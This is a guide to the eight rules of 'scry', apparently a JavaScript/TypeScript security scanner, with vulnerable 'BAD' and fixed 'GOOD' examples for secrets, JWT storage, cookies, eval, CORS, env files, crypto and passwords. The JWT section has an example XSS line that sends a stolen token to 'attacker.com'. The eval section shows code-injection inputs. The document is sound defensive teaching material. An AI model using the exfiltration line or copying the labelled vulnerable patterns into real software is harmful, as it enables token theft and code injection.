# Security Rules Guide

Detailed documentation of all security rules implemented in scry, including what they detect, why they matter, and how to fix the issues.

---

## Overview

scry implements 8 critical security rules that cover common vulnerabilities in JavaScript and TypeScript applications:

1. [Hardcoded Secrets](#hardcoded-secrets)
2. [JWT in Client Storage](#jwt-in-client-storage)
3. [Insecure Cookies](#insecure-cookies)
4. [eval() Usage](#eval-usage)
5. [CORS Misconfiguration](#cors-misconfiguration)
6. [Environment File Exposure](#environment-file-exposure)
7. [Weak Cryptography](#weak-cryptography)
8. [Password Security](#password-security)

---

## Hardcoded Secrets

**Severity:** HIGH  
**Rule ID:** `hardcoded-secrets`  
**Rule Status:** error

### What It Detects

Hardcoded secrets embedded directly in source code:

- AWS access keys (AKIA format)
- API keys and tokens
- Database passwords
- Private encryption keys
- GitHub personal access tokens
- Slack/Discord webhooks

### Why It Matters

Hardcoded secrets in version control are exposed to:

1. **Repository Access:** Anyone with repo access sees secrets
2. **Source Code Disclosure:** GitHub search can find exposed secrets
3. **Supply Chain Risk:** Compromised dependencies expose downstream apps
4. **Audit Trail:** Git history permanently contains secrets

**Risk Level:** CRITICAL - Requires immediate key rotation

### Example Vulnerable Code

```javascript
// BAD: Hardcoded API key
const apiKey = "sk-proj-abc123def456ghi789jkl";
const response = await fetch("https://api.example.com/data", {
  headers: { "X-API-Key": apiKey },
});

// BAD: AWS credentials in code
const AWS = require("aws-sdk");
AWS.config.update({
  accessKeyId: "AKIAIOSFODNN7EXAMPLE",
  secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
});

// BAD: Database password hardcoded
const connection = mysql.createConnection({
  host: "db.example.com",
  user: "admin",
  password: "MySecurePassword123!", // Exposed in code
});
```

### How to Fix

**Option 1: Environment Variables (Recommended)**

```javascript
// GOOD: Load from environment
const apiKey = process.env.API_KEY;
if (!apiKey) {
  throw new Error("API_KEY environment variable not set");
}

const response = await fetch("https://api.example.com/data", {
  headers: { "X-API-Key": apiKey },
});
```

**.env file:**

```
API_KEY=sk-proj-abc123def456ghi789jkl
DATABASE_PASSWORD=SecurePassword123
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

**Option 2: Secrets Management Service**

```javascript
// Using AWS Secrets Manager
const secretsManager = new AWS.SecretsManager();

const secret = await secretsManager
  .getSecretValue({
    SecretId: "prod/database/password",
  })
  .promise();

const password = JSON.parse(secret.SecretString).password;
```

**Option 3: Configuration File (Secure)**

```javascript
// Load from secure config file (not in version control)
const config = require("./config/secrets.json");
// Ensure secrets.json is in .gitignore!

const apiKey = config.apiKey;
```

### Configuration Rule

```json
{
  "rules": {
    "hardcoded-secrets": "error"
  }
}
```

### Learn More

- [OWASP: Secrets Management](https://owasp.org/www-community/Sensitive_Data_Exposure)
- [AWS Best Practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html)
- [npm dotenv package](https://www.npmjs.com/package/dotenv)

---

## JWT in Client Storage

**Severity:** HIGH  
**Rule ID:** `jwt-storage`  
**Rule Status:** error

### What It Detects

JWT tokens stored in insecure client-side locations:

- localStorage (vulnerable to XSS)
- sessionStorage (vulnerable to XSS)
- Cookie without httpOnly flag
- Global variables or window scope
- IndexedDB (if not encrypted)

### Why It Matters

Client-side storage of JWT tokens enables XSS attacks:

1. **XSS Vulnerability:** JavaScript can steal tokens from localStorage
2. **No Server Control:** Client can modify or replay tokens
3. **Persistent Risk:** Stored indefinitely until cleared
4. **Scope Bleed:** Accessible to any script on the page

**Attack Scenario:**

```javascript
// Attacker injects script via XSS
const token = localStorage.getItem("jwt_token");
// Send to attacker's server
fetch("https://attacker.com/steal?token=" + token);
```

### Example Vulnerable Code

```javascript
// BAD: JWT in localStorage (vulnerable to XSS)
const token = jwt.sign(userData, SECRET);
localStorage.setItem("auth_token", token);

// Later in code:
const auth = localStorage.getItem("auth_token");
const decoded = jwt.verify(auth, SECRET);

// BAD: JWT in sessionStorage
sessionStorage.setItem("jwt", token);

// BAD: JWT as global variable
window.authToken = token;

// BAD: JWT in non-httpOnly cookie
res.cookie("token", token); // Accessible via JavaScript!
```

### How to Fix

**Best Practice: HTTP-Only, Secure Cookies**

```javascript
// Server-side: Set secure, httpOnly cookie
res.cookie("auth_token", token, {
  httpOnly: true, // Prevents JavaScript access
  secure: true, // HTTPS only
  sameSite: "Strict", // CSRF protection
  maxAge: 3600000, // 1 hour expiration
});

// Client-side: No need to store anything!
// Browser automatically sends with requests

// For API calls, no explicit header needed
fetch("/api/protected", {
  method: "GET",
  // Cookie automatically included by browser
});
```

**Alternative: Memory Storage (Short-Lived)**

```javascript
// Store in memory (cleared on page refresh)
let authToken = null;

function setAuthToken(token) {
  authToken = token;
  // Start auto-refresh before expiration
  scheduleTokenRefresh(token);
}

function getAuthToken() {
  return authToken;
}

// Use in requests
fetch("/api/data", {
  headers: {
    Authorization: `Bearer ${getAuthToken()}`,
  },
});
```

### Configuration Rule

```json
{
  "rules": {
    "jwt-storage": "error"
  }
}
```

### Learn More

- [OWASP: JWT Storage](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0: Where to Store Tokens](https://auth0.com/docs/security/tokens/token-storage)
- [MDN: httpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrictions_with_the_secure_and_httponly_attributes)

---

## Insecure Cookies

**Severity:** HIGH  
**Rule ID:** `cookie-security`  
**Rule Status:** error

### What It Detects

Cookies missing critical security flags:

- Missing `httpOnly` flag (XSS vulnerability)
- Missing `Secure` flag (HTTPS enforcement)
- Missing `SameSite` flag (CSRF vulnerability)
- Overly permissive `Domain` attribute
- Excessively long cookie lifetime

### Why It Matters

Cookies store sensitive session data. Without proper flags:

1. **XSS Attacks:** JavaScript can steal tokens (missing httpOnly)
2. **Man-in-the-Middle:** Sent over HTTP (missing Secure)
3. **CSRF Attacks:** Sent cross-domain (missing SameSite)
4. **Session Hijacking:** Long expiry increases attack window

### Example Vulnerable Code

```javascript
// BAD: Missing all security flags
res.cookie("sessionId", token);

// BAD: Missing httpOnly (XSS risk)
res.cookie("sessionId", token, {
  secure: true,
  sameSite: "Strict",
});

// BAD: Missing Secure flag (MITM risk)
res.cookie("sessionId", token, {
  httpOnly: true,
  sameSite: "Strict",
});

// BAD: Missing SameSite (CSRF risk)
res.cookie("sessionId", token, {
  httpOnly: true,
  secure: true,
});

// BAD: Overly permissive domain
res.cookie("sessionId", token, {
  domain: ".example.com", // Shared across all subdomains
  httpOnly: true,
  secure: true,
});
```

### How to Fix

**Secure Cookie Configuration**

```javascript
// GOOD: All flags set properly
res.cookie("sessionId", token, {
  httpOnly: true, // Prevents JavaScript access
  secure: true, // HTTPS only
  sameSite: "Strict", // No cross-site sending
  path: "/", // Limit to root path
  maxAge: 3600000, // 1 hour expiration
  domain: "example.com", // Specific domain only
});

// GOOD: For production Express app
const express = require("express");
const session = require("express-session");

app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production", // true in prod
      sameSite: "Strict",
      maxAge: 3600000,
    },
  }),
);
```

### SameSite Attribute Guide

| Value    | Behavior                      | Use Case             |
| -------- | ----------------------------- | -------------------- |
| `Strict` | Never sent to other sites     | Most secure          |
| `Lax`    | Sent on top-level navigations | Balances security/UX |
| `None`   | Always sent (requires Secure) | Third-party cookies  |

**Recommendation:** Use `Strict` unless you specifically need `Lax`.

### Configuration Rule

```json
{
  "rules": {
    "cookie-security": "error"
  }
}
```

### Learn More

- [OWASP: Cookie Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cookie-based-approach)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

## eval() Usage

**Severity:** HIGH  
**Rule ID:** `eval-usage`  
**Rule Status:** error

### What It Detects

Usage of dynamic code execution functions:

- `eval()` - Direct JavaScript evaluation
- `Function()` constructor - Dynamic function creation
- `setTimeout(string)` - Delayed code execution
- `setInterval(string)` - Repeated code execution
- `innerHTML` with dynamic scripts - DOM-based execution

### Why It Matters

`eval()` and similar functions create security vulnerabilities:

1. **Code Injection:** Attackers can execute arbitrary code
2. **No Sandbox:** Full access to application state
3. **Hard to Audit:** Code evaluated at runtime
4. **Performance:** Slower than pre-compiled code

**Attack Example:**

```javascript
// If userInput = "); alert('hacked'); ("
eval("showMessage('" + userInput + "')");
// Results in: showMessage(''); alert('hacked'); ('')
```

### Example Vulnerable Code

```javascript
// BAD: eval() with user input
const userCode = request.body.code;
eval(userCode); // Arbitrary code execution!

// BAD: Function constructor
const operations = {
  "+": (a, b) => a + b,
  "-": (a, b) => a - b,
};
const operator = request.query.op;
const fn = new Function("a", "b", `return a ${operator} b`);
// Attacker can inject: "; console.log(secrets); return a"

// BAD: setTimeout with string
setTimeout("updateUI('" + data + "')", 1000);

// BAD: innerHTML with script
element.innerHTML = "<script>" + userInput + "</script>";
```

### How to Fix

**Use Pre-compiled Functions Instead**

```javascript
// GOOD: Define operations as functions
const operations = {
  "+": (a, b) => a + b,
  "-": (a, b) => a - b,
  "*": (a, b) => a * b,
  "/": (a, b) => a / b,
};

// Safely get operation
const operator = request.query.op;
if (!operations[operator]) {
  throw new Error("Invalid operator");
}
const result = operations[operator](a, b);

// GOOD: setTimeout with function
setTimeout(() => updateUI(data), 1000);

// GOOD: Use textContent instead of innerHTML
element.textContent = userInput;

// For complex DOM: Use framework sanitization
const DOMPurify = require("dompurify");
element.innerHTML = DOMPurify.sanitize(userInput);
```

**For Template Execution:**

```javascript
// Instead of eval()
const template = require("template-engine");
const result = template.render("my-template", {
  variables: userProvidedVariables,
});

// Or use secure template engines
const nunjucks = require("nunjucks");
const html = nunjucks.render("template.html", {
  data: userData, // Safely interpolated
});
```

### Configuration Rule

```json
{
  "rules": {
    "eval-usage": "error"
  }
}
```

### Learn More

- [MDN: eval is Evil](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [OWASP: Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)

---

## CORS Misconfiguration

**Severity:** MEDIUM  
**Rule ID:** `cors-config`  
**Rule Status:** warn

### What It Detects

Overly permissive CORS (Cross-Origin Resource Sharing) settings:

- Wildcard origin (`*`) allowing all domains
- Credential exposure with wildcard
- Unrestricted HTTP methods
- Overly broad allowed headers
- Missing CORS validation

### Why It Matters

Misconfigured CORS enables cross-site attacks:

1. **Unauthorized Requests:** Any website can make requests to your API
2. **Credential Theft:** Can send requests with your cookies/credentials
3. **API Abuse:** Open to brute force, scraping, DOS
4. **Data Exposure:** Sensitive data accessible from other origins

### Example Vulnerable Code

```javascript
// BAD: Allow all origins
app.use(cors());

// Equivalent to:
app.use(
  cors({
    origin: "*",
  }),
);

// BAD: Allow all origins with credentials
app.use(
  cors({
    origin: "*",
    credentials: true, // Contradictory!
  }),
);

// BAD: Overly permissive
app.use(
  cors({
    origin: (origin, callback) => {
      // Accept ANY origin without validation
      callback(null, true);
    },
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    allowedHeaders: "*",
  }),
);
```

### How to Fix

**Specify Allowed Origins**

```javascript
// GOOD: Whitelist specific origins
const cors = require("cors");

const allowedOrigins = [
  "https://www.example.com",
  "https://app.example.com",
  "https://admin.example.com",
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
  }),
);

// GOOD: Per-route CORS control
app.get("/api/public", cors(), (req, res) => {
  // Public endpoint - allow CORS
  res.json({ data: "public" });
});

app.post(
  "/api/protected",
  cors({
    origin: allowedOrigins,
    credentials: true,
  }),
  authenticate,
  (req, res) => {
    // Protected endpoint - restricted CORS
    res.json({ data: "protected" });
  },
);

// GOOD: Environment-based configuration
const corsOptions = {
  origin: process.env.ALLOWED_ORIGINS?.split(",") || [],
  credentials: true,
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type"],
};

app.use(cors(corsOptions));
```

### CORS Best Practices

```javascript
// Comprehensive secure CORS setup
const cors = require("cors");

const corsOptions = {
  // Only allow specific origins
  origin: (origin, callback) => {
    const allowedOrigins = ["https://example.com", "https://app.example.com"];

    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("CORS not allowed for " + origin));
    }
  },

  // Allow credentials only with specific origins
  credentials: true,

  // Restrict HTTP methods
  methods: ["GET", "POST", "PUT", "DELETE"],

  // Limit allowed headers
  allowedHeaders: ["Content-Type", "Authorization"],

  // Expose only necessary headers
  exposedHeaders: ["X-Total-Count"],

  // Cache preflight for 1 day
  maxAge: 86400,
};

app.use(cors(corsOptions));
```

### Configuration Rule

```json
{
  "rules": {
    "cors-config": "warn"
  }
}
```

### Learn More

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP: Cross Origin Resource Sharing](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)
- [npm: cors package](https://www.npmjs.com/package/cors)

---

## Environment File Exposure

**Severity:** HIGH  
**Rule ID:** `env-exposure`  
**Rule Status:** error

### What It Detects

Environment files and sensitive configuration in version control:

- `.env` files committed to git
- `.env.local`, `.env.*.local` files
- Environment files in public directories
- Secrets in configuration files
- AWS credentials files in repo

### Why It Matters

Exposed environment files contain production secrets:

1. **Credential Exposure:** Database passwords, API keys
2. **Permanent History:** Git history forever contains secrets
3. **Supply Chain Risk:** Compromises all who clone the repo
4. **Compliance Violations:** Violates security policies

### Example Vulnerable Code

```
// BAD: .env file committed to version control
DATABASE_URL=postgres://user:password@db.example.com:5432/prod
API_KEY=sk-proj-secret123
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=super-secret-jwt-key
STRIPE_API_KEY=sk_live_abc123def456
```

### How to Fix

**Use .gitignore to Exclude Environment Files**

```
# .gitignore
.env
.env.local
.env.*.local
.env.production

# Also ignore:
.aws/
secrets.json
private_key
config/secrets.js
```

**Create .env.example for Documentation**

```
# .env.example (SAFE TO COMMIT)
# Copy this file to .env and fill in actual values

DATABASE_URL=postgres://user:password@localhost:5432/dev
API_KEY=your-api-key-here
AWS_ACCESS_KEY=your-aws-key
AWS_SECRET_KEY=your-aws-secret
JWT_SECRET=your-jwt-secret
STRIPE_API_KEY=your-stripe-key
```

**Load Environment Variables Properly**

```javascript
// GOOD: Use dotenv package
require("dotenv").config();

const dbUrl = process.env.DATABASE_URL;
const apiKey = process.env.API_KEY;

if (!dbUrl || !apiKey) {
  throw new Error("Required environment variables not set");
}

// GOOD: Validate on startup
const requiredEnvVars = ["DATABASE_URL", "API_KEY", "JWT_SECRET", "NODE_ENV"];

requiredEnvVars.forEach((envVar) => {
  if (!process.env[envVar]) {
    throw new Error(`Environment variable ${envVar} is required`);
  }
});

// GOOD: Use different files for different environments
// .env.development
// .env.staging
// .env.production (never committed)

const envFile = `.env.${process.env.NODE_ENV || "development"}`;
require("dotenv").config({ path: envFile });
```

### If Secrets Are Already Exposed

```bash
# 1. Stop using exposed credentials immediately
# Rotate all exposed API keys, passwords, database credentials

# 2. Remove from git history (use BFG Repo-Cleaner)
bfg --delete-files .env  # or use git-filter-branch

# 3. Verify removal
git log --full-history --all -- '.env'

# 4. Add to .gitignore
echo ".env" >> .gitignore

# 5. Force push (if it's your repo)
git push --force
```

### Configuration Rule

```json
{
  "rules": {
    "env-exposure": "error"
  }
}
```

### Learn More

- [npm: dotenv](https://www.npmjs.com/package/dotenv)
- [OWASP: Secrets Exposure](https://owasp.org/www-community/Sensitive_Data_Exposure)
- [GitHub: Removing Sensitive Data](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository)

---

## Weak Cryptography

**Severity:** HIGH  
**Rule ID:** `weak-crypto`  
**Rule Status:** error

### What It Detects

Use of cryptographically weak algorithms:

- MD5 hashing (broken)
- SHA1 hashing (broken)
- DES encryption (56-bit keys)
- RC4 encryption (flawed)
- Unsalted hashing (rainbow table attacks)
- Low iteration counts (bcrypt/PBKDF2)

### Why It Matters

Weak crypto makes passwords and data vulnerable:

1. **Hash Cracking:** MD5/SHA1 can be reversed in minutes
2. **Collision Attacks:** Multiple inputs hash to same value
3. **Brute Force:** Low iteration counts enable fast attacks
4. **Data Exposure:** Encrypted data easily decrypted

**Example:** MD5 hash "5d41402abc4b2a76b9719d911017c592" = "hello"
(Can be reverse-looked up in seconds)

### Example Vulnerable Code

```javascript
// BAD: MD5 hashing (cryptographically broken)
const crypto = require("crypto");
const hash = crypto.createHash("md5").update(password).digest("hex");

// BAD: SHA1 hashing (deprecated)
const hash = crypto.createHash("sha1").update(password).digest("hex");

// BAD: Hashing without salt
const hash = crypto.createHash("sha256").update(password).digest("hex");

// BAD: Low iteration bcrypt
const bcrypt = require("bcrypt");
const hash = await bcrypt.hash(password, 1); // 1 round is too few!

// BAD: DES encryption (56-bit, broken)
const cipher = crypto.createCipher("des", key);

// BAD: No encryption at all
database.store("password", password); // Plaintext!
```

### How to Fix

**Use bcrypt for Password Hashing (Recommended)**

```javascript
// GOOD: bcrypt with proper rounds
const bcrypt = require("bcrypt");

// Hash password with 12 rounds (standard recommendation)
const saltRounds = 12;
const hash = await bcrypt.hash(password, saltRounds);

// Verify password
const isValid = await bcrypt.compare(password, hash);

// Use in Express middleware
app.post("/register", async (req, res) => {
  const { password } = req.body;

  try {
    const hash = await bcrypt.hash(password, 12);
    await database.users.create({
      email: req.body.email,
      passwordHash: hash,
    });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Registration failed" });
  }
});

app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  const user = await database.users.findOne({ email });

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Set secure session/JWT
  res.json({ token: jwt.sign({ userId: user.id }, process.env.JWT_SECRET) });
});
```

**Use AES-256 for Data Encryption**

```javascript
// GOOD: AES-256-GCM encryption
const crypto = require("crypto");

function encrypt(plaintext, encryptionKey) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-gcm", encryptionKey, iv);

  let encrypted = cipher.update(plaintext, "utf8", "hex");
  encrypted += cipher.final("hex");

  const authTag = cipher.getAuthTag();

  return iv.toString("hex") + ":" + encrypted + ":" + authTag.toString("hex");
}

function decrypt(ciphertext, encryptionKey) {
  const [iv, encrypted, authTag] = ciphertext.split(":");

  const decipher = crypto.createDecipheriv(
    "aes-256-gcm",
    encryptionKey,
    Buffer.from(iv, "hex"),
  );

  decipher.setAuthTag(Buffer.from(authTag, "hex"));

  let decrypted = decipher.update(encrypted, "hex", "utf8");
  decrypted += decipher.final("utf8");

  return decrypted;
}
```

**Use Argon2 (Modern Alternative)**

```javascript
// GOOD: Argon2 for password hashing (most secure)
const argon2 = require("argon2");

// Hash password
const hash = await argon2.hash(password, {
  type: argon2.argon2i,
  memoryCost: 65536, // 64 MB
  timeCost: 3,
});

// Verify password
const isValid = await argon2.verify(hash, password);
```

### Hash Algorithm Comparison

| Algorithm | Status      | Use Case                     |
| --------- | ----------- | ---------------------------- |
| MD5       | BROKEN      | DO NOT USE                   |
| SHA1      | DEPRECATED  | DO NOT USE                   |
| SHA256    | Valid       | Fast hashing (not passwords) |
| bcrypt    | Recommended | Password hashing             |
| Argon2    | Best        | Password hashing (modern)    |

### Configuration Rule

```json
{
  "rules": {
    "weak-crypto": "error"
  }
}
```

### Learn More

- [OWASP: Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [npm: bcrypt](https://www.npmjs.com/package/bcrypt)
- [npm: argon2](https://www.npmjs.com/package/argon2)
- [NIST: Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

## Password Security

**Severity:** HIGH  
**Rule ID:** `password-security`  
**Rule Status:** error

### What It Detects

Insecure password handling practices:

- Plaintext password storage
- Weak password validation rules
- Password exposure in logs/errors
- Insecure password transmission
- Hard-coded passwords
- Passwords sent via HTTP
- Insufficient iteration counts

### Why It Matters

Passwords are primary authentication method:

1. **Breach Impact:** Plaintext passwords expose user accounts
2. **Credential Stuffing:** Weak validation allows weak passwords
3. **Transmission Risk:** HTTP sends passwords unencrypted
4. **Database Exposure:** Plaintext passwords exposed in data breaches

### Example Vulnerable Code

```javascript
// BAD: Plaintext password storage
const user = {
  email: "user@example.com",
  password: "mypassword123", // Never store plaintext!
};
await database.users.create(user);

// BAD: Logging passwords
console.log("User login attempt:", { email, password }); // Exposed in logs!

// BAD: Weak password validation
function isValidPassword(password) {
  return password.length > 3; // Too weak!
}

// BAD: Password in error message
try {
  await login(email, password);
} catch (error) {
  return res.status(401).send(`Login failed for ${email}: ${error.message}`);
}

// BAD: Passwords sent via HTTP
app.post("http://example.com/login", (req, res) => {
  const { password } = req.body; // Transmitted unencrypted!
});

// BAD: Password exposed in URL
fetch("/api/login?email=user@example.com&password=secret");

// BAD: Weak hashing
const password_hash = simpleHash(password); // Custom hash algorithm!
```

### How to Fix

**Secure Password Hashing**

```javascript
// GOOD: Use bcrypt for hashing
const bcrypt = require("bcrypt");

app.post("/register", async (req, res) => {
  const { email, password } = req.body;

  // Hash password with 12 rounds
  const passwordHash = await bcrypt.hash(password, 12);

  // Store hash only (never plaintext)
  await database.users.create({
    email,
    passwordHash, // Hash, not plaintext
    createdAt: new Date(),
  });

  res.json({ success: true, message: "Registration successful" });
});
```

**Strong Password Validation**

```javascript
// GOOD: Comprehensive password validation
function validatePassword(password) {
  const errors = [];

  if (password.length < 12) {
    errors.push("Password must be at least 12 characters");
  }
  if (!/[A-Z]/.test(password)) {
    errors.push("Password must contain uppercase letter");
  }
  if (!/[a-z]/.test(password)) {
    errors.push("Password must contain lowercase letter");
  }
  if (!/[0-9]/.test(password)) {
    errors.push("Password must contain number");
  }
  if (!/[!@#$%^&*]/.test(password)) {
    errors.push("Password must contain special character (!@#$%^&*)");
  }

  return {
    isValid: errors.length === 0,
    errors,
  };
}

// Check against common passwords
const commonPasswords = require("common-passwords-list");

function checkCommonPassword(password) {
  return !commonPasswords.includes(password.toLowerCase());
}

// Enforce in registration
app.post("/register", async (req, res) => {
  const { email, password } = req.body;

  const validation = validatePassword(password);
  if (!validation.isValid) {
    return res.status(400).json({
      error: "Password is not strong enough",
      details: validation.errors,
    });
  }

  if (!checkCommonPassword(password)) {
    return res.status(400).json({
      error: "This password is too common. Please choose a different one.",
    });
  }

  // Proceed with registration
  const passwordHash = await bcrypt.hash(password, 12);
  await database.users.create({ email, passwordHash });

  res.json({ success: true });
});
```

**Secure Password Transmission**

```javascript
// GOOD: HTTPS only, proper headers
app.post("/api/login", (req, res) => {
  // Middleware ensures HTTPS
  if (req.protocol !== "https") {
    return res.status(400).send("HTTPS required");
  }

  // Never log passwords
  const { email, password } = req.body;
  // DON'T log these!

  // ... authentication logic ...
});

// GOOD: Set secure headers
app.use((req, res, next) => {
  res.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  res.set("X-Content-Type-Options", "nosniff");
  next();
});

// GOOD: Use secure cookies for session
res.cookie("sessionId", token, {
  httpOnly: true,
  secure: true, // HTTPS only
  sameSite: "Strict",
});
```

**Password Storage Best Practices**

```javascript
// GOOD: Complete implementation
const bcrypt = require("bcrypt");

class UserService {
  async registerUser(email, password) {
    // Validate password strength
    if (password.length < 12) {
      throw new Error("Password must be at least 12 characters");
    }

    // Hash with proper cost
    const passwordHash = await bcrypt.hash(password, 12);

    // Store only hash
    return await database.users.create({
      email,
      passwordHash,
      createdAt: new Date(),
    });
  }

  async authenticateUser(email, password) {
    const user = await database.users.findOne({ email });

    if (!user) {
      // Don't reveal whether email exists
      throw new Error("Invalid credentials");
    }

    const isValid = await bcrypt.compare(password, user.passwordHash);

    if (!isValid) {
      throw new Error("Invalid credentials");
    }

    return user;
  }

  async changePassword(userId, oldPassword, newPassword) {
    const user = await database.users.findById(userId);

    // Verify old password
    const isValid = await bcrypt.compare(oldPassword, user.passwordHash);
    if (!isValid) {
      throw new Error("Current password is incorrect");
    }

    // Hash new password
    const newHash = await bcrypt.hash(newPassword, 12);

    // Update
    await database.users.update(userId, {
      passwordHash: newHash,
    });
  }
}
```

### Configuration Rule

```json
{
  "rules": {
    "password-security": "error"
  }
}
```

### Learn More

- [OWASP: Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [NIST: Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [npm: bcrypt](https://www.npmjs.com/package/bcrypt)
- [CommonPasswords List](https://github.com/deanmalmgren/common-passwords-list)

---

## Rule Configuration

### Severity Levels

| Level | Meaning                    | Default Behavior         |
| ----- | -------------------------- | ------------------------ |
| error | Must fix before deployment | Fails strict mode        |
| warn  | Should fix soon            | Reports but doesn't fail |
| off   | Disabled                   | Not checked              |

### Configure in .scryrc.json

```json
{
  "rules": {
    "hardcoded-secrets": "error",
    "jwt-storage": "error",
    "cookie-security": "error",
    "eval-usage": "error",
    "cors-config": "warn",
    "env-exposure": "error",
    "weak-crypto": "error",
    "password-security": "error"
  }
}
```

### Override Command Line

```bash
# Only run specific rule
scry scan . --rule hardcoded-secrets

# Set minimum severity
scry scan . --min-severity high

# Fail on warnings
scry scan . --strict
```

---

## Summary

All 8 security rules in scry address real-world vulnerabilities found in JavaScript/TypeScript applications. Implementing fixes for these rules significantly improves application security and reduces data breach risk.

**Next Steps:**

- Review your code against these rules
- Implement recommended fixes
- Configure rules for your project
- Run scry regularly in your CI/CD pipeline
